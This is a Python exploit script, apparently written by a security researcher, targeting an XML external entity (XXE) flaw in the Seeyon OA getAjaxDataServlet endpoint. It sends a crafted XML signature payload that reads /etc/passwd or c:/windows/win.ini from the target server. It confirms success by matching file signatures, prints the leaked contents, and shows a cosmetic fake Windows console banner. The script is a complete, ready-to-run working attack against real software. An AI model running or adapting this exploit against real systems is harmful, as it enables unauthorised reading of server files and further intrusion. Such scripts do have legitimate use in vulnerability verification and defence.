#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib3

urllib3.disable_warnings()

payloads = ["c:/windows/win.ini", "/etc/passwd"]

def verify(site):
    headers = {
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
      'Content-Type': 'application/x-www-form-urlencoded',
      }
    target = site + '/seeyon/m-signature/RunSignature/run/getAjaxDataServlet'
    for payload in payloads:
        data = 'S=ajaxColManager&M=colDelLock&imgvalue=lr7V9+0XCEhZ5KUijesavRASMmpz%2FJcFgNqW4G2x63IPfOy%3DYudDQ1bnHT8BLtwokmb%2Fk&signwidth=4.0&signheight=4.0&xmlValue=%3C%3Fxml+version%3D%221.0%22%3F%3E%0D%0A%3C%21DOCTYPE+foo+%5B%0D%0A++%3C%21ELEMENT+foo+ANY+%3E%0D%0A++%3C%21ENTITY+xxe+SYSTEM+%22file%3A%2F%2F%2F'+payload+'%22+%3E%0D%0A%5D%3E%0D%0A%3CSignature%3E%3CField%3E%3Ca+Index%3D%22ProtectItem%22%3Etrue%3C%2Fa%3E%3Cb+Index%3D%22Caption%22%3Ecaption%3C%2Fb%3E%3Cc+Index%3D%22ID%22%3Eid%3C%2Fc%3E%3Cd+Index%3D%22VALUE%22%3E%26xxe%3B%3C%2Fd%3E%3C%2FField%3E%3C%2FSignature%3E'
        try:
            res=requests.post(url=target,headers=headers,data=data,timeout=5,verify=False)
            if res.status_code == 200 and (re.search(r'; for 16-bit app support',res.text,re.S) or re.search(r'root:[x*]:0:0:',res.text,re.S)):
                return payload, res.text.split("fieldValue=")[1].split("encodeValue=")[0]
        except:
            print(sys.exc_info())
            pass
    return "", ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 seeyon-getAjaxDataServlet-xxe.py ",target)
    payload, data = verify(target)
    if payload != "":
        print("[+]漏洞存在，读取的文件是：", payload, "\n内容为：", data)
    else:
        print("[-]漏洞不存在")
